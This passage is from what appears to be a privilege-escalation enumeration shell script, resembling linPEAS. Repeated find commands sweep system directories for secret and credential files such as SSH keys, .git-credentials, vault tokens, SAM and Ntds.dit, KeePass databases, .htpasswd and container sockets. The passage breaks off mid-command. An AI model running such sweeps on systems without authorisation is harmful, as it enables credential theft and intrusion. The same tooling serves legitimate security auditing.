  FIND_DIR_CDROM=`eval_bckgrd "find /cdrom -type d -name \"sentry\" -o -name \"couchdb\" -o -name \"postfix\" -o -name \".cloudflared\" -o -name \".password-store\" -o -name \"zabbix\" -o -name \"roundcube\" -o -name \"keyrings\" -o -name \"environments\" -o -name \".kube*\" -o -name \".bluemix\" -o -name \"seeddms*\" -o -name \".irssi\" -o -name \"neo4j\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"nginx\" -o -name \"mysql\" -o -name \"ldap\" -o -name \".vnc\" -o -name \"cacti\" -o -name \".svn\" -o -name \"sites-enabled\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_ETC=`eval_bckgrd "find /etc -type d -name \"sentry\" -o -name \"couchdb\" -o -name \"bind\" -o -name \"postfix\" -o -name \"pam.d\" -o -name \".cloudflared\" -o -name \"zabbix\" -o -name \".password-store\" -o -name \"roundcube\" -o -name \"keyrings\" -o -name \"environments\" -o -name \".kube*\" -o -name \".bluemix\" -o -name \"seeddms*\" -o -name \".irssi\" -o -name \"neo4j\" -o -name \"system-connections\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"system.d\" -o -name \"nginx\" -o -name \"mysql\" -o -name \"ldap\" -o -name \"kubernetes\" -o -name \".vnc\" -o -name \"cacti\" -o -name \".svn\" -o -name \"sites-enabled\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_HOMESEARCH=`eval_bckgrd "find $HOMESEARCH -type d -name \"sentry\" -o -name \"couchdb\" -o -name \"postfix\" -o -name \".cloudflared\" -o -name \".password-store\" -o -name \"zabbix\" -o -name \"roundcube\" -o -name \"keyrings\" -o -name \"environments\" -o -name \".kube*\" -o -name \".bluemix\" -o -name \"seeddms*\" -o -name \".irssi\" -o -name \"neo4j\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"nginx\" -o -name \"mysql\" -o -name \"ldap\" -o -name \".vnc\" -o -name \"cacti\" -o -name \".svn\" -o -name \"sites-enabled\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_MEDIA=`eval_bckgrd "find /media -type d -name \"sentry\" -o -name \"couchdb\" -o -name \"postfix\" -o -name \".cloudflared\" -o -name \".password-store\" -o -name \"zabbix\" -o -name \"roundcube\" -o -name \"keyrings\" -o -name \"environments\" -o -name \".kube*\" -o -name \".bluemix\" -o -name \"seeddms*\" -o -name \".irssi\" -o -name \"neo4j\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"nginx\" -o -name \"mysql\" -o -name \"ldap\" -o -name \".vnc\" -o -name \"cacti\" -o -name \".svn\" -o -name \"sites-enabled\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_MNT=`eval_bckgrd "find /mnt -type d -name \"sentry\" -o -name \"couchdb\" -o -name \"postfix\" -o -name \".cloudflared\" -o -name \".password-store\" -o -name \"zabbix\" -o -name \"roundcube\" -o -name \"keyrings\" -o -name \"environments\" -o -name \".kube*\" -o -name \".bluemix\" -o -name \"seeddms*\" -o -name \".irssi\" -o -name \"neo4j\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"nginx\" -o -name \"mysql\" -o -name \"ldap\" -o -name \".vnc\" -o -name \"cacti\" -o -name \".svn\" -o -name \"sites-enabled\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_OPT=`eval_bckgrd "find /opt -type d -name \"sentry\" -o -name \"couchdb\" -o -name \"postfix\" -o -name \".cloudflared\" -o -name \".password-store\" -o -name \"zabbix\" -o -name \"roundcube\" -o -name \"keyrings\" -o -name \"environments\" -o -name \".kube*\" -o -name \".bluemix\" -o -name \"seeddms*\" -o -name \".irssi\" -o -name \"neo4j\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"nginx\" -o -name \"mysql\" -o -name \"ldap\" -o -name \".vnc\" -o -name \"cacti\" -o -name \".svn\" -o -name \"sites-enabled\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_PRIVATE=`eval_bckgrd "find /private -type d -name \"sentry\" -o -name \"couchdb\" -o -name \"postfix\" -o -name \".cloudflared\" -o -name \".password-store\" -o -name \"zabbix\" -o -name \"roundcube\" -o -name \"keyrings\" -o -name \"environments\" -o -name \".kube*\" -o -name \".bluemix\" -o -name \"seeddms*\" -o -name \".irssi\" -o -name \"neo4j\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"nginx\" -o -name \"mysql\" -o -name \"ldap\" -o -name \".vnc\" -o -name \"cacti\" -o -name \".svn\" -o -name \"sites-enabled\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_SBIN=`eval_bckgrd "find /sbin -type d -name \"sentry\" -o -name \"couchdb\" -o -name \"postfix\" -o -name \".cloudflared\" -o -name \".password-store\" -o -name \"zabbix\" -o -name \"roundcube\" -o -name \"keyrings\" -o -name \"environments\" -o -name \".kube*\" -o -name \".bluemix\" -o -name \"seeddms*\" -o -name \".irssi\" -o -name \"neo4j\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"nginx\" -o -name \"mysql\" -o -name \"ldap\" -o -name \".vnc\" -o -name \"cacti\" -o -name \".svn\" -o -name \"sites-enabled\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_SNAP=`eval_bckgrd "find /snap -type d -name \"sentry\" -o -name \"couchdb\" -o -name \"postfix\" -o -name \".cloudflared\" -o -name \".password-store\" -o -name \"zabbix\" -o -name \"roundcube\" -o -name \"keyrings\" -o -name \"environments\" -o -name \".kube*\" -o -name \".bluemix\" -o -name \"seeddms*\" -o -name \".irssi\" -o -name \"neo4j\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"nginx\" -o -name \"mysql\" -o -name \"ldap\" -o -name \".vnc\" -o -name \"cacti\" -o -name \".svn\" -o -name \"sites-enabled\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_SRV=`eval_bckgrd "find /srv -type d -name \"sentry\" -o -name \"couchdb\" -o -name \"postfix\" -o -name \".cloudflared\" -o -name \".password-store\" -o -name \"zabbix\" -o -name \"roundcube\" -o -name \"keyrings\" -o -name \"environments\" -o -name \".kube*\" -o -name \".bluemix\" -o -name \"seeddms*\" -o -name \".irssi\" -o -name \"neo4j\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"nginx\" -o -name \"mysql\" -o -name \"ldap\" -o -name \".vnc\" -o -name \"cacti\" -o -name \".svn\" -o -name \"sites-enabled\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_TMP=`eval_bckgrd "find /tmp -type d -name \"sentry\" -o -name \"couchdb\" -o -name \"postfix\" -o -name \".cloudflared\" -o -name \".password-store\" -o -name \"zabbix\" -o -name \"roundcube\" -o -name \"keyrings\" -o -name \"environments\" -o -name \".kube*\" -o -name \".bluemix\" -o -name \"seeddms*\" -o -name \".irssi\" -o -name \"neo4j\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"nginx\" -o -name \"mysql\" -o -name \"ldap\" -o -name \".vnc\" -o -name \"cacti\" -o -name \".svn\" -o -name \"sites-enabled\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_USR=`eval_bckgrd "find /usr -type d -name \"sentry\" -o -name \"couchdb\" -o -name \"bind\" -o -name \"postfix\" -o -name \".cloudflared\" -o -name \".password-store\" -o -name \"zabbix\" -o -name \"roundcube\" -o -name \"keyrings\" -o -name \"environments\" -o -name \".kube*\" -o -name \".bluemix\" -o -name \"seeddms*\" -o -name \".irssi\" -o -name \"neo4j\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"nginx\" -o -name \"mysql\" -o -name \"ldap\" -o -name \".vnc\" -o -name \"cacti\" -o -name \".svn\" -o -name \"sites-enabled\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_VAR=`eval_bckgrd "find /var -type d -name \"sentry\" -o -name \"couchdb\" -o -name \"bind\" -o -name \"postfix\" -o -name \".cloudflared\" -o -name \"zabbix\" -o -name \".password-store\" -o -name \"roundcube\" -o -name \"keyrings\" -o -name \"environments\" -o -name \".kube*\" -o -name \".bluemix\" -o -name \"seeddms*\" -o -name \".irssi\" -o -name \"neo4j\" -o -name \"kube-proxy\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"nginx\" -o -name \"mysql\" -o -name \"ldap\" -o -name \"kubelet\" -o -name \".vnc\" -o -name \"cacti\" -o -name \".svn\" -o -name \"sites-enabled\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_APPLICATIONS=`eval_bckgrd "find /applications -name \"storage.php\" -o -name \"ipsec.conf\" -o -name \".bashrc\" -o -name \".plan\" -o -name \"setupinfo\" -o -name \"*.sqlite\" -o -name \"jetty-realm.properties\" -o -name \"*.crt\" -o -name \"*.jks\" -o -name \"scclient.exe\" -o -name \"*.keystore\" -o -name \"software\" -o -name \".pypirc\" -o -name \"sssd.conf\" -o -name \"ffftp.ini\" -o -name \"*.cer\" -o -name \".vault-token\" -o -name \"id_rsa*\" -o -name \"backups\" -o -name \"autologin.conf\" -o -name \"filezilla.xml\" -o -name \"server.xml\" -o -name \".git-credentials\" -o -name \"glusterfs.ca\" -o -name \"zabbix_agentd.conf\" -o -name \"default.sav\" -o -name \"dockershim.sock\" -o -name \"ipsec.secrets\" -o -name \"postgresql.conf\" -o -name \"scheduledtasks.xml\" -o -name \"racoon.conf\" -o -name \"TokenCache.dat\" -o -name \"log4j-core*.jar\" -o -name \".erlang.cookie\" -o -name \"passwd\" -o -name \"protecteduserkey.bin\" -o -name \"cesi.conf\" -o -name \"mosquitto.conf\" -o -name \"*.pem\" -o -name \"AzureRMContext.json\" -o -name \"ntuser.dat\" -o -name \"*config*.php\" -o -name \"*.swp\" -o -name \"000-default.conf\" -o -name \"zabbix_server.conf\" -o -name \"supervisord.conf\" -o -name \"sysprep.inf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kibana.y*ml\" -o -name \"*vnc*.ini\" -o -name \"access_tokens.json\" -o -name \".env\" -o -name \".k5login\" -o -name \"*.keyring\" -o -name \"*vnc*.xml\" -o -name \"*.pgp\" -o -name \".google_authenticator\" -o -name \"secrets.ldb\" -o -name \"backup\" -o -name \"authorized_hosts\" -o -name \"legacy_credentials.db\" -o -name \"ddclient.conf\" -o -name \"passbolt.php\" -o -name \"krb5.conf\" -o -name \"pgadmin*.db\" -o -name \"autologin\" -o -name \"unattend.txt\" -o -name \"*vnc*.txt\" -o -name \"debian.cnf\" -o -name \"fastcgi_params\" -o -name \"*.psk\" -o -name \"hosts.equiv\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"settings.php\" -o -name \"azureProfile.json\" -o -name \"*.gpg\" -o -name \"glusterfs.pem\" -o -name \"web*.config\" -o -name \"glusterfs.key\" -o -name \"*.sqlite3\" -o -name \"rktlet.sock\" -o -name \"pagefile.sys\" -o -name \".wgetrc\" -o -name \"rsyncd.secrets\" -o -name \"wp-config.php\" -o -name \"cloud.cfg\" -o -name \"elasticsearch.y*ml\" -o -name \"security.sav\" -o -name \".git\" -o -name \"https.conf\" -o -name \"access_tokens.db\" -o -name \"*.db\" -o -name \"winscp.ini\" -o -name \"psk.txt\" -o -name \"software.sav\" -o -name \"my.cnf\" -o -name \"mongod*.conf\" -o -name \"creds*\" -o -name \"KeePass.ini\" -o -name \"*.service\" -o -name \"password*.ibd\" -o -name \"*.key\" -o -name \"drives.xml\" -o -name \"*.pfx\" -o -name \"mariadb.cnf\" -o -name \"my.ini\" -o -name \"db.php\" -o -name \"gitlab.yml\" -o -name \"*.der\" -o -name \"*vnc*.c*nf*\" -o -name \"docker-compose.yml\" -o -name \"docker.sock\" -o -name \"access.log\" -o -name \".rhosts\" -o -name \"gitlab.rm\" -o -name \"groups.xml\" -o -name \".github\" -o -name \"authorized_keys\" -o -name \"ws_ftp.ini\" -o -name \".secrets.mkey\" -o -name \".profile\" -o -name \"docker.socket\" -o -name \"wsl.exe\" -o -name \"gvm-tools.conf\" -o -name \"KeePass.config*\" -o -name \"*password*\" -o -name \"kcpassword\" -o -name \"bash.exe\" -o -name \"crio.sock\" -o -name \"secrets.yml\" -o -name \"NetSetup.log\" -o -name \"*.ovpn\" -o -name \"snmpd.conf\" -o -name \"unattended.xml\" -o -name \"SAM\" -o -name \"*.timer\" -o -name \"system.sav\" -o -name \"database.php\" -o -name \"sentry.conf.py\" -o -name \"pg_hba.conf\" -o -name \"error.log\" -o -name \".lesshst\" -o -name \"*.csr\" -o -name \"index.dat\" -o -name \"sitemanager.xml\" -o -name \".gitconfig\" -o -name \".msmtprc\" -o -name \"vault-ssh-helper.hcl\" -o -name \"frakti.sock\" -o -name \"*.p12\" -o -name \"*.ftpconfig\" -o -name \"ftp.ini\" -o -name \"AppEvent.Evt\" -o -name \"setupinfo.bak\" -o -name \"containerd.sock\" -o -name \"rocketchat.service\" -o -name \".ldaprc\" -o -name \"*.socket\" -o -name \"Dockerfile\" -o -name \"httpd.conf\" -o -name \"wcx_ftp.ini\" -o -name \"accessTokens.json\" -o -name \"appcmd.exe\" -o -name \"KeePass.enforced*\" -o -name \"*.rdg\" -o -name \"unattend.inf\" -o -name \"credentials.db\" -o -name \"RDCMan.settings\" -o -name \"kadm5.acl\" -o -name \"printers.xml\" -o -name \".recently-used.xbel\" -o -name \"php.ini\" -o -name \"*.viminfo\" -o -name \"nginx.conf\" -o -name \"*.kdbx\" -o -name \"SecEvent.Evt\" -o -name \"*_history*\" -o -name \"*.keytab\" -o -name \"pwd.ibd\" -o -name \"hostapd.conf\" -o -name \"id_dsa*\" -o -name \"iis6.log\" -o -name \"passwd.ibd\" -o -name \"FreeSSHDservice.ini\" -o -name \"redis.conf\" -o -name \"*credential*\" -o -name \"anaconda-ks.cfg\" -o -name \"ftp.config\" -o -name \"SYSTEM\" -o -name \".htpasswd\" -o -name \"rsyncd.conf\" -o -name \"datasources.xml\" -o -name \"recentservers.xml\" -o -name \"known_hosts\" -o -name \".sudo_as_admin_successful\" -o -name \"*.gnupg\" -o -name \"Ntds.dit\" -o -name \"sites.ini\" -o -name \"https-xampp.conf\" -o -name \"unattend.xml\" -o -name \"pgsql.conf\" -o -name \"tomcat-users.xml\" -o -name \"config.php\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_BIN=`eval_bckgrd "find /bin -name \"storage.php\" -o -name \"ipsec.conf\" -o -name \".bashrc\" -o -name \".plan\" -o -name \"setupinfo\" -o -name \"*.sqlite\" -o -name \"jetty-realm.properties\" -o -name \"*.crt\" -o -name \"*.jks\" -o -name \"scclient.exe\" -o -name \"*.keystore\" -o -name \"software\" -o -name \".pypirc\" -o -name \"sssd.conf\" -o -name \"ffftp.ini\" -o -name \"*.cer\" -o -name \".vault-token\" -o -name \"id_rsa*\" -o -name \"backups\" -o -name \"autologin.conf\" -o -name \"filezilla.xml\" -o -name \"server.xml\" -o -name \".git-credentials\" -o -name \"glusterfs.ca\" -o -name \"zabbix_agentd.conf\" -o -name \"default.sav\" -o -name \"dockershim.sock\" -o -name \"ipsec.secrets\" -o -name \"postgresql.conf\" -o -name \"scheduledtasks.xml\" -o -name \"racoon.conf\" -o -name \"TokenCache.dat\" -o -name \"log4j-core*.jar\" -o -name \".erlang.cookie\" -o -name \"passwd\" -o -name \"protecteduserkey.bin\" -o -name \"cesi.conf\" -o -name \"mosquitto.conf\" -o -name \"*.pem\" -o -name \"AzureRMContext.json\" -o -name \"ntuser.dat\" -o -name \"*config*.php\" -o -name \"*.swp\" -o -name \"000-default.conf\" -o -name \"zabbix_server.conf\" -o -name \"supervisord.conf\" -o -name \"sysprep.inf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kibana.y*ml\" -o -name \"*vnc*.ini\" -o -name \"access_tokens.json\" -o -name \".env\" -o -name \".k5login\" -o -name \"*.keyring\" -o -name \"*vnc*.xml\" -o -name \"*.pgp\" -o -name \".google_authenticator\" -o -name \"secrets.ldb\" -o -name \"backup\" -o -name \"authorized_hosts\" -o -name \"legacy_credentials.db\" -o -name \"ddclient.conf\" -o -name \"passbolt.php\" -o -name \"krb5.conf\" -o -name \"pgadmin*.db\" -o -name \"autologin\" -o -name \"unattend.txt\" -o -name \"*vnc*.txt\" -o -name \"debian.cnf\" -o -name \"fastcgi_params\" -o -name \"*.psk\" -o -name \"hosts.equiv\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"settings.php\" -o -name \"azureProfile.json\" -o -name \"*.gpg\" -o -name \"glusterfs.pem\" -o -name \"web*.config\" -o -name \"glusterfs.key\" -o -name \"*.sqlite3\" -o -name \"rktlet.sock\" -o -name \"pagefile.sys\" -o -name \".wgetrc\" -o -name \"rsyncd.secrets\" -o -name \"wp-config.php\" -o -name \"cloud.cfg\" -o -name \"elasticsearch.y*ml\" -o -name \"security.sav\" -o -name \".git\" -o -name \"https.conf\" -o -name \"access_tokens.db\" -o -name \"*.db\" -o -name \"winscp.ini\" -o -name \"psk.txt\" -o -name \"software.sav\" -o -name \"my.cnf\" -o -name \"mongod*.conf\" -o -name \"creds*\" -o -name \"KeePass.ini\" -o -name \"*.service\" -o -name \"password*.ibd\" -o -name \"*.key\" -o -name \"drives.xml\" -o -name \"*.pfx\" -o -name \"mariadb.cnf\" -o -name \"my.ini\" -o -name \"db.php\" -o -name \"gitlab.yml\" -o -name \"*.der\" -o -name \"*vnc*.c*nf*\" -o -name \"docker-compose.yml\" -o -name \"docker.sock\" -o -name \"access.log\" -o -name \".rhosts\" -o -name \"gitlab.rm\" -o -name \"groups.xml\" -o -name \".github\" -o -name \"authorized_keys\" -o -name \"ws_ftp.ini\" -o -name \".secrets.mkey\" -o -name \".profile\" -o -name \"docker.socket\" -o -name \"wsl.exe\" -o -name \"gvm-tools.conf\" -o -name \"KeePass.config*\" -o -name \"*password*\" -o -name \"kcpassword\" -o -name \"bash.exe\" -o -name \"crio.sock\" -o -name \"secrets.yml\" -o -name \"NetSetup.log\" -o -name \"*.ovpn\" -o -name \"snmpd.conf\" -o -name \"unattended.xml\" -o -name \"SAM\" -o -name \"*.timer\" -o -name \"system.sav\" -o -name \"database.php\" -o -name \"sentry.conf.py\" -o -name \"pg_hba.conf\" -o -name \"error.log\" -o -name \".lesshst\" -o -name \"*.csr\" -o -name \"index.dat\" -o -name \"sitemanager.xml\" -o -name \".gitconfig\" -o -name \".msmtprc\" -o -name \"vault-ssh-helper.hcl\" -o -name \"frakti.sock\" -o -name \"*.p12\" -o -name \"*.ftpconfig\" -o -name \"ftp.ini\" -o -name \"AppEvent.Evt\" -o -name \"setupinfo.bak\" -o -name \"containerd.sock\" -o -name \"rocketchat.service\" -o -name \".ldaprc\" -o -name \"*.socket\" -o -name \"Dockerfile\" -o -name \"httpd.conf\" -o -name \"wcx_ftp.ini\" -o -name \"accessTokens.json\" -o -name \"appcmd.exe\" -o -name \"KeePass.enforced*\" -o -name \"*.rdg\" -o -name \"unattend.inf\" -o -name \"credentials.db\" -o -name \"RDCMan.settings\" -o -name \"kadm5.acl\" -o -name \"printers.xml\" -o -name \".recently-used.xbel\" -o -name \"php.ini\" -o -name \"*.viminfo\" -o -name \"nginx.conf\" -o -name \"*.kdbx\" -o -name \"SecEvent.Evt\" -o -name \"*_history*\" -o -name \"*.keytab\" -o -name \"pwd.ibd\" -o -name \"hostapd.conf\" -o -name \"id_dsa*\" -o -name \"iis6.log\" -o -name \"passwd.ibd\" -o -name \"FreeSSHDservice.ini\" -o -name \"redis.conf\" -o -name \"*credential*\" -o -name \"anaconda-ks.cfg\" -o -name \"ftp.config\" -o -name \"SYSTEM\" -o -name \".htpasswd\" -o -name \"rsyncd.conf\" -o -name \"datasources.xml\" -o -name \"recentservers.xml\" -o -name \"known_hosts\" -o -name \".sudo_as_admin_successful\" -o -name \"*.gnupg\" -o -name \"Ntds.dit\" -o -name \"sites.ini\" -o -name \"https-xampp.conf\" -o -name \"unattend.xml\" -o -name \"pgsql.conf\" -o -name \"tomcat-users.xml\" -o -name \"config.php\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_CACHE=`eval_bckgrd "find /.cache -name \"storage.php\" -o -name \"ipsec.conf\" -o -name \".bashrc\" -o -name \".plan\" -o -name \"setupinfo\" -o -name \"*.sqlite\" -o -name \"jetty-realm.properties\" -o -name \"*.crt\" -o -name \"*.jks\" -o -name \"scclient.exe\" -o -name \"*.keystore\" -o -name \"software\" -o -name \".pypirc\" -o -name \"sssd.conf\" -o -name \"ffftp.ini\" -o -name \"*.cer\" -o -name \".vault-token\" -o -name \"id_rsa*\" -o -name \"backups\" -o -name \"autologin.conf\" -o -name \"filezilla.xml\" -o -name \"server.xml\" -o -name \".git-credentials\" -o -name \"glusterfs.ca\" -o -name \"zabbix_agentd.conf\" -o -name \"default.sav\" -o -name \"dockershim.sock\" -o -name \"ipsec.secrets\" -o -name \"postgresql.conf\" -o -name \"scheduledtasks.xml\" -o -name \"racoon.conf\" -o -name \"TokenCache.dat\" -o -name \"log4j-core*.jar\" -o -name \".erlang.cookie\" -o -name \"passwd\" -o -name \"protecteduserkey.bin\" -o -name \"cesi.conf\" -o -name \"mosquitto.conf\" -o -name \"*.pem\" -o -name \"AzureRMContext.json\" -o -name \"ntuser.dat\" -o -name \"*config*.php\" -o -name \"*.swp\" -o -name \"000-default.conf\" -o -name \"zabbix_server.conf\" -o -name \"supervisord.conf\" -o -name \"sysprep.inf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kibana.y*ml\" -o -name \"*vnc*.ini\" -o -name \"access_tokens.json\" -o -name \".env\" -o -name \".k5login\" -o -name \"*.keyring\" -o -name \"*vnc*.xml\" -o -name \"*.pgp\" -o -name \".google_authenticator\" -o -name \"secrets.ldb\" -o -name \"backup\" -o -name \"authorized_hosts\" -o -name \"legacy_credentials.db\" -o -name \"ddclient.conf\" -o -name \"passbolt.php\" -o -name \"krb5.conf\" -o -name \"pgadmin*.db\" -o -name \"autologin\" -o -name \"unattend.txt\" -o -name \"*vnc*.txt\" -o -name \"debian.cnf\" -o -name \"fastcgi_params\" -o -name \"*.psk\" -o -name \"hosts.equiv\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"settings.php\" -o -name \"azureProfile.json\" -o -name \"*.gpg\" -o -name \"glusterfs.pem\" -o -name \"web*.config\" -o -name \"glusterfs.key\" -o -name \"*.sqlite3\" -o -name \"rktlet.sock\" -o -name \"pagefile.sys\" -o -name \".wgetrc\" -o -name \"rsyncd.secrets\" -o -name \"wp-config.php\" -o -name \"cloud.cfg\" -o -name \"elasticsearch.y*ml\" -o -name \"security.sav\" -o -name \".git\" -o -name \"https.conf\" -o -name \"access_tokens.db\" -o -name \"*.db\" -o -name \"winscp.ini\" -o -name \"psk.txt\" -o -name \"software.sav\" -o -name \"my.cnf\" -o -name \"mongod*.conf\" -o -name \"creds*\" -o -name \"KeePass.ini\" -o -name \"*.service\" -o -name \"password*.ibd\" -o -name \"*.key\" -o -name \"drives.xml\" -o -name \"*.pfx\" -o -name \"mariadb.cnf\" -o -name \"my.ini\" -o -name \"db.php\" -o -name \"gitlab.yml\" -o -name \"*.der\" -o -name \"*vnc*.c*nf*\" -o -name \"docker-compose.yml\" -o -name \"docker.sock\" -o -name \"access.log\" -o -name \".rhosts\" -o -name \"gitlab.rm\" -o -name \"groups.xml\" -o -name \".github\" -o -name \"authorized_keys\" -o -name \"ws_ftp.ini\" -o -name \".secrets.mkey\" -o -name \".profile\" -o -name \"docker.socket\" -o -name \"wsl.exe\" -o -name \"gvm-tools.conf\" -o -name \"KeePass.config*\" -o -name \"*password*\" -o -name \"kcpassword\" -o -name \"bash.exe\" -o -name \"crio.sock\" -o -name \"secrets.yml\" -o -name \"NetSetup.log\" -o -name \"*.ovpn\" -o -name \"snmpd.conf\" -o -name \"unattended.xml\" -o -name \"SAM\" -o -name \"*.timer\" -o -name \"system.sav\" -o -name \"database.php\" -o -name \"sentry.conf.py\" -o -name \"pg_hba.conf\" -o -name \"error.log\" -o -name \".lesshst\" -o -name \"*.csr\" -o -name \"index.dat\" -o -name \"sitemanager.xml\" -o -name \".gitconfig\" -o -name \".msmtprc\" -o -name \"vault-ssh-helper.hcl\" -o -name \"frakti.sock\" -o -name \"*.p12\" -o -name \"*.ftpconfig\" -o -name \"ftp.ini\" -o -name \"AppEvent.Evt\" -o -name \"setupinfo.bak\" -o -name \"containerd.sock\" -o -name \"rocketchat.service\" -o -name \".ldaprc\" -o -name \"*.socket\" -o -name \"Dockerfile\" -o -name \"httpd.conf\" -o -name \"wcx_ftp.ini\" -o -name \"accessTokens.json\" -o -name \"appcmd.exe\" -o -name \"KeePass.enforced*\" -o -name \"*.rdg\" -o -name \"unattend.inf\" -o -name \"credentials.db\" -o -name \"RDCMan.settings\" -o -name \"kadm5.acl\" -o -name \"printers.xml\" -o -name \".recently-used.xbel\" -o -name \"php.ini\" -o -name \"*.viminfo\" -o -name \"nginx.conf\" -o -name \"*.kdbx\" -o -name \"SecEvent.Evt\" -o -name \"*_history*\" -o -name \"*.keytab\" -o -name \"pwd.ibd\" -o -name \"hostapd.conf\" -o -name \"id_dsa*\" -o -name \"iis6.log\" -o -name \"passwd.ibd\" -o -name \"FreeSSHDservice.ini\" -o -name \"redis.conf\" -o -name \"*credential*\" -o -name \"anaconda-ks.cfg\" -o -name \"ftp.config\" -o -name \"SYSTEM\" -o -name \".htpasswd\" -o -name \"rsyncd.conf\" -o -name \"datasources.xml\" -o -name \"recentservers.xml\" -o -name \"known_hosts\" -o -name \".sudo_as_admin_successful\" -o -name \"*.gnupg\" -o -name \"Ntds.dit\" -o -name \"sites.ini\" -o -name \"https-xampp.conf\" -o -name \"unattend.xml\" -o -name \"pgsql.conf\" -o -name \"tomcat-users.xml\" -o -name \"config.php\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_CDROM=`eval_bckgrd "find /cdrom -name \"storage.php\" -o -name \"ipsec.conf\" -o -name \".bashrc\" -o -name \".plan\" -o -name \"setupinfo\" -o -name \"*.sqlite\" -o -name \"jetty-realm.properties\" -o -name \"*.crt\" -o -name \"*.jks\" -o -name \"scclient.exe\" -o -name \"*.keystore\" -o -name \"software\" -o -name \".pypirc\" -o -name \"sssd.conf\" -o -name \"ffftp.ini\" -o -name \"*.cer\" -o -name \".vault-token\" -o -name \"id_rsa*\" -o -name \"backups\" -o -name \"autologin.conf\" -o -name \"filezilla.xml\" -o -name \"server.xml\" -o -name \".git-credentials\" -o -name \"glusterfs.ca\" -o -name \"zabbix_agentd.conf\" -o -name \"default.sav\" -o -name \"dockershim.sock\" -o -name \"ipsec.secrets\" -o -name \"postgresql.conf\" -o -name \"scheduledtasks.xml\" -o -name \"racoon.conf\" -o -name \"TokenCache.dat\" -o -name \"log4j-core*.jar\" -o -name \".erlang.cookie\" -o -name \"passwd\" -o -name \"protecteduserkey.bin\" -o -name \"cesi.conf\" -o -name \"mosquitto.conf\" -o -name \"*.pem\" -o -name \"AzureRMContext.json\" -o -name \"ntuser.dat\" -o -name \"*config*.php\" -o -name \"*.swp\" -o -name \"000-default.conf\" -o -name \"zabbix_server.conf\" -o -name \"supervisord.conf\" -o -name \"sysprep.inf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kibana.y*ml\" -o -name \"*vnc*.ini\" -o -name \"access_tokens.json\" -o -name \".env\" -o -name \".k5login\" -o -name \"*.keyring\" -o -name \"*vnc*.xml\" -o -name \"*.pgp\" -o -name \".google_authenticator\" -o -name \"secrets.ldb\" -o -name \"backup\" -o -name \"authorized_hosts\" -o -name \"legacy_credentials.db\" -o -name \"ddclient.conf\" -o -name \"passbolt.php\" -o -name \"krb5.conf\" -o -name \"pgadmin*.db\" -o -name \"autologin\" -o -name \"unattend.txt\" -o -name \"*vnc*.txt\" -o -name \"debian.cnf\" -o -name \"fastcgi_params\" -o -name \"*.psk\" -o -name \"hosts.equiv\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"settings.php\" -o -name \"azureProfile.json\" -o -name \"*.gpg\" -o -name \"glusterfs.pem\" -o -name \"web*.config\" -o -name \"glusterfs.key\" -o -name \"*.sqlite3\" -o -name \"rktlet.sock\" -o -name \"pagefile.sys\" -o -name \".wgetrc\" -o -name \"rsyncd.secrets\" -o -name \"wp-config.php\" -o -name \"cloud.cfg\" -o -name \"elasticsearch.y*ml\" -o -name \"security.sav\" -o -name \".git\" -o -name \"https.conf\" -o -name \"access_tokens.db\" -o -name \"*.db\" -o -name \"winscp.ini\" -o -name \"psk.txt\" -o -name \"software.sav\" -o -name \"my.cnf\" -o -name \"mongod*.conf\" -o -name \"creds*\" -o -name \"KeePass.ini\" -o -name \"*.service\" -o -name \"password*.ibd\" -o -name \"*.key\" -o -name \"drives.xml\" -o -name \"*.pfx\" -o -name \"mariadb.cnf\" -o -name \"my.ini\" -o -name \"db.php\" -o -name \"gitlab.yml\" -o -name \"*.der\" -o -name \"*vnc*.c*nf*\" -o -name \"docker-compose.yml\" -o -name \"docker.sock\" -o -name \"access.log\" -o -name \".rhosts\" -o -name \"gitlab.rm\" -o -name \"groups.xml\" -o -name \".github\" -o -name \"authorized_keys\" -o -name \"ws_ftp.ini\" -o -name \".secrets.mkey\" -o -name \".profile\" -o -name \"docker.socket\" -o -name \"wsl.exe\" -o -name 